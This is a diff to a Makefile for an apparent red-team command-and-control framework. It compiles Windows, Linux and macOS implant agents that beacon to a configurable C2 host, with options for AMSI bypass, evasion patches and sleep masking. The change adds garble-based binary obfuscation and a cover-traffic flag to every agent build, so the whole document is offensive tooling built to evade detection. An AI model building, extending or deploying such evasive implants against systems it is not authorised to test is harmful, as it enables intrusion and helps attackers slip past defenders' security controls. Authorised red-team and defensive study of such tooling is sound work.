@@ -10,14 +10,23 @@ TOOLS_DIR  ?= /opt/tools/SharpCollection/NetFramework_4.5_x64
 export PATH := $(GOROOT)/bin:$(PATH)
 MODULE  := redteam
 
-C2_HOST     ?= 127.0.0.1
-SLEEP       ?= 60
-JITTER      ?= 20
-EVASION     ?= true
-SLEEP_MASK  ?= ekko
-AMSI_METHOD ?= veh
-KILL_DATE   ?=
-AGENTPKG    := redteam/agents/agent-go
+C2_HOST       ?= 127.0.0.1
+SLEEP         ?= 60
+JITTER        ?= 20
+EVASION       ?= true
+SLEEP_MASK    ?= ekko
+AMSI_METHOD   ?= veh
+KILL_DATE     ?=
+OBFUSCATE     ?= false
+COVER_TRAFFIC ?= false
+AGENTPKG      := redteam/agents/agent-go
+GARBLE        := $(GOPATH)/bin/garble
+
+ifeq ($(OBFUSCATE),true)
+  AGENT_BUILD := $(GARBLE) -literals -tiny build
+else
+  AGENT_BUILD := $(GO) build
+endif
 GUI_PORT ?= 8888
 GUI_HOST ?= 127.0.0.1
 PROFILE  ?= $(HOME)/.endgame/profiles/stark.json
@@ -25,6 +34,10 @@ PROFILE  ?= $(HOME)/.endgame/profiles/stark.json
 .PHONY: all server client agent-exe agent-mtls agent-raw agent-linux agent-darwin certs run init deps bofs tools clean start build-start stop
 
 all: server client agent-exe
+
+## Install garble (binary obfuscator) — run once before using OBFUSCATE=true
+garble-install:
+	$(GO) install mvdan.cc/garble@latest
 
 ## Install system dependencies (run once as root or with sudo)
 deps:
@@ -58,11 +71,11 @@ client:
 	chmod 755 bin/c2-client
 
 ## Build Windows agent (.exe) via HTTP
-## Usage: make agent-exe C2_HOST=10.2.20.200 SLEEP=5 EVASION=false
+## Usage: make agent-exe C2_HOST=10.2.20.200 SLEEP=5 EVASION=false OBFUSCATE=true COVER_TRAFFIC=true
 agent-exe:
 	mkdir -p bin
 	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
-	$(GO) build \
+	$(AGENT_BUILD) \
 	  -ldflags "-s -w \
 	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
 	    -X '$(AGENTPKG).Transport=http' \
@@ -71,6 +84,7 @@ agent-exe:
 	    -X '$(AGENTPKG).EvasionPatches=$(EVASION)' \
 	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)' \
 	    -X '$(AGENTPKG).AMSIMethod=$(AMSI_METHOD)' \
+	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
 	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
 	  -trimpath \
 	  -o bin/agent.exe \
@@ -80,7 +94,7 @@ agent-exe:
 agent-mtls:
 	mkdir -p bin
 	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
-	$(GO) build \
+	$(AGENT_BUILD) \
 	  -ldflags "-s -w \
 	    -X '$(AGENTPKG).ServerURL=https://$(C2_HOST):8443' \
 	    -X '$(AGENTPKG).Transport=mtls' \
@@ -90,7 +104,8 @@ agent-mtls:
 	    -X '$(AGENTPKG).AgentCertPEM=$(shell cat certs/agent.crt 2>/dev/null | base64 -w0)' \
 	    -X '$(AGENTPKG).AgentKeyPEM=$(shell cat certs/agent.key 2>/dev/null | base64 -w0)' \
 	    -X '$(AGENTPKG).CACertPEM=$(shell cat certs/ca.crt 2>/dev/null | base64 -w0)' \
-	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)'" \
+	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)' \
+	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)'" \
 	  -trimpath \
 	  -o bin/agent-mtls.exe \
 	  ./agents/agent-go/cmd/
@@ -100,12 +115,13 @@ agent-mtls:
 agent-linux:
 	mkdir -p bin
 	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
-	$(GO) build \
+	$(AGENT_BUILD) \
 	  -ldflags "-s -w \
 	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
 	    -X '$(AGENTPKG).Transport=http' \
 	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
 	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
+	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
 	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
 	  -trimpath \
 	  -o bin/agent-linux \
@@ -116,12 +132,13 @@ agent-linux:
 agent-darwin:
 	mkdir -p bin
 	CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 \
-	$(GO) build \
+	$(AGENT_BUILD) \
 	  -ldflags "-s -w \
 	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
 	    -X '$(AGENTPKG).Transport=http' \
 	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
 	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
+	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
 	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
 	  -trimpath \
 	  -o bin/agent-darwin \
